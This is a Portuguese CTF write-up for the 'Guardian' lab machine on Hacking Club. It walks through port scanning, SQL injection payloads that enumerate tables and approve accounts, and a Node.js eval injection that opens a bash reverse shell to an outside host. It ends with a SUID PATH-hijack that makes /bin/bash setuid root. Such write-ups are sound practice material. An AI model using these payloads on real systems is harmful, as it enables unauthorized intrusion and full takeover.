@@ -1,0 +1,152 @@
+---
+title: 'Guardian Writeup'
+date: '2024-06-16'
+tags: ['SQLI', 'CODE INJECTION', 'Linux']
+draft: false
+summary: 'Writeup do CTF Guardian da Hacking Club.'
+images: ['/static/images/guardian-writeup-images/1.png']
+authors: ['default']
+---
+
+![Guardian 1](/static/images/guardian-writeup-images/1.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Guardian
+
+### IP: 172.16.4.104
+
+---
+
+### Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 d3:3b:8b:a7:7a:ac:07:57:97:2b:23:35:fc:a4:5e:42 (ECDSA)
+|_  256 b7:4c:f4:d4:3f:be:78:52:88:50:3a:d0:33:b9:48:b1 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+| http-title: Guardian Insurance
+|_Requested resource was /login
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Somente as portas 22(SSH) e 80 (HTTP) estão abertas.
+
+---
+
+## Enumeration
+
+![Guardian 2](/static/images/guardian-writeup-images/2.png)
+
+A primeira coisa que eu tentei for um SQLi (SQL Injection) nessa parte da aplicação , mas não funcionou.
+
+Entretanto a parte de “Register for first access” é vulnerável.
+![Guardian 3](/static/images/guardian-writeup-images/3.png)
+
+Se você passar ‘ or 1=1# diretamente vc já bypassa. Mas eu optei fazer pelo burp.
+![Guardian 4](/static/images/guardian-writeup-images/4.png)
+
+Após isso registrei um novo usuário.
+![Guardian 5](/static/images/guardian-writeup-images/5.png)
+
+Quando você tentar se logar , ele diz que precisa a aprovação do admin:
+![Guardian 6](/static/images/guardian-writeup-images/6.png)
+Veja que a aplicação retorna um JWT , eu pensei inicialmente em atacar esse JWT com bruteforce e none attack mas não deu certo.
+
+Como já temos um SQLi (Sql Injection) na parte de “register for first access” a gente vai usar isso pra alterar a aprovação no banco de dados.
+
+```jsx
+"EIN": "' or 1=1; SELECT table_name FROM information_schema.tables WHERE table_schema=database();-- "
+```
+
+![Guardian 7](/static/images/guardian-writeup-images/7.png)
+
+```jsx
+"EIN": "' or 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users';-- "
+```
+
+![Guardian 8](/static/images/guardian-writeup-images/8.png)
+
+```jsx
+"EIN": "' or 1=1; UPDATE users SET approved = 1 WHERE approved = 0;-- "
+```
+
+![Guardian 9](/static/images/guardian-writeup-images/9.png)
+
+![Guardian 10](/static/images/guardian-writeup-images/10.png)
+
+Com isso podemos logar no sistema .
+![Guardian 11](/static/images/guardian-writeup-images/11.png)
+
+O sistema não tem muita funcionalidade , somente a rota `/customers` funciona.
+
+Quando abrimos a aba de customers e interceptamos , a gente ve que existe um parâmetro chamado “action” sendo passado.
+![Guardian 12](/static/images/guardian-writeup-images/12.png)
+
+Quando passamos o +2\*5 a aplicação retorna o valor 10, ou seja ela está executando a função `eval()` logo o parâmetro `action` é vulnerável a code injection.
+
+```
+ "action": "db.getClients('56-7890123') +2*5"
+```
+
+![Guardian 13](/static/images/guardian-writeup-images/13.png)
+
+---
+
+## Foot Hold
+
+```jsx
+"action": "db.getClients('56-7890123'); require('child_process').execSync('bash -c \\"bash -i >& /dev/tcp/10.0.31.150/4444 0>&1\\"').toString();"
+```
+
+![Guardian 14](/static/images/guardian-writeup-images/14.png)
+
+`nc -lnvp 4444`
+![Guardian 15](/static/images/guardian-writeup-images/15.png)
+
+---
+
+## Privilege Escalation
+
+**SUID** /opt/backup encontrado:
+
+`find / -perm -u=s 2>/dev/null`
+![Guardian 16](/static/images/guardian-writeup-images/16.png)
+
+Verificando as strings do SUID:
+
+`strings backup`
+![Guardian 17](/static/images/guardian-writeup-images/17.png)
+
+O plano é criar um script chamado `mysqldump` que será invocado antes pelo ELF chamado`backup`.
+
+No Linux, as coisas são executadas em uma ordem específica. Quando executamos um comando, o Linux usa a variável de ambiente `$PATH` para encontrar onde esse programa está localizado (em qual diretório). Podemos modificar isso para fazer o programa procurar primeiro na pasta `/tmp`.
+
+Assim, em vez do programa executar sua função normal, faremos com que ele execute nosso script malicioso primeiro:
+
+```bash
+echo '#!/bin/bash' > /tmp/mysqldump
+echo 'chmod u+s /bin/bash' >> /tmp/mysqldump
+chmod +x /tmp/mysqldump
+export PATH=/tmp:$PATH
+./backup mysql_backup:7fxzh7m*
+```
+
+![Guardian 18](/static/images/guardian-writeup-images/18.png)
+
+Ou seja, criamos um script malicioso que, quando executado pelo programa SUID `backup` (com `bash -p` para manter as permissões), vai modificar o `/bin/bash` para nos conceder root.
+
+---
+
+## Proof
+
+![Guardian 19](/static/images/guardian-writeup-images/19.png)
